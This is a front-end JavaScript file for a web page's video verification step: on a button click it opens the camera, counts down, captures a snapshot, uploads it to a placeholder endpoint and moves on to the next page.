const loadingScreen = document.getElementById('loading');
const minimumLoadingTime = 2000; 
const startTime = Date.now();
let stream;

window.onload = function () {
    const elapsedTime = Date.now() - startTime;
    const remainingTime = minimumLoadingTime - elapsedTime;

    setTimeout(() => {
        loadingScreen.style.display = 'none';
    }, Math.max(remainingTime, 0));

    document.getElementById('current-year').textContent = new Date().getFullYear();
};

function startVideoVerification() {
    const cameraView = document.getElementById('camera-view');
    const video = document.getElementById('video');
    const countdown = document.getElementById('countdown');
    const startButton = document.getElementById('start-verification-btn');

    startButton.disabled = true;
    startButton.textContent = 'Verification in progress...';

    cameraView.style.display = 'block';
    countdown.style.display = 'block';

    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then((mediaStream) => {
                stream = mediaStream;
                video.srcObject = stream;

                startCountdown(10, () => captureSnapshot(video));
            })
            .catch((error) => {
                console.error("Error accessing the camera: ", error);
                alert("Unable to access the camera. Please check your device settings.");
                resetVerificationButton(startButton);
            });
    } else {
        alert("Camera not supported on this device.");
        resetVerificationButton(startButton);
    }
}

function startCountdown(seconds, callback) {
    const countdown = document.getElementById('countdown');
    countdown.textContent = seconds;

    const interval = setInterval(() => {
        seconds -= 1;
        countdown.textContent = seconds;

        if (seconds <= 0) {
            clearInterval(interval);
            countdown.style.display = 'none';
            callback();
        }
    }, 1000);
}

function captureSnapshot(video) {
    if (!stream) return;

    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    context.translate(canvas.width, 0);
    context.scale(-1, 1);
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob((blob) => {
        if (blob) {
            stream.getTracks().forEach(track => track.stop());
            sendSnapshot(blob);
        } else {
            console.error('Failed to capture the snapshot.');
            alert('Failed to capture the snapshot.');
        }
    }, 'image/jpeg');
}

function sendSnapshot(blob) {
    const formData = new FormData();
    formData.append('file', blob, 'snapshot.jpg');

    fetch('https://example.com/upload', {
        method: 'POST',
        body: formData
    })
        .then((response) => response.json())
        .then((data) => {
            console.log('Image uploaded successfully:', data);
            alert('Image uploaded successfully.');
            window.location.href = 'page5.html';
        })
        .catch((error) => {
            console.error('Error uploading the image:', error);
            alert('Failed to upload the image.');
            resetVerificationButton(document.getElementById('start-verification-btn'));
        });
}

function resetVerificationButton(button) {
    button.disabled = false;
    button.textContent = 'Start Video Verification';
}

window.onbeforeunload = () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
};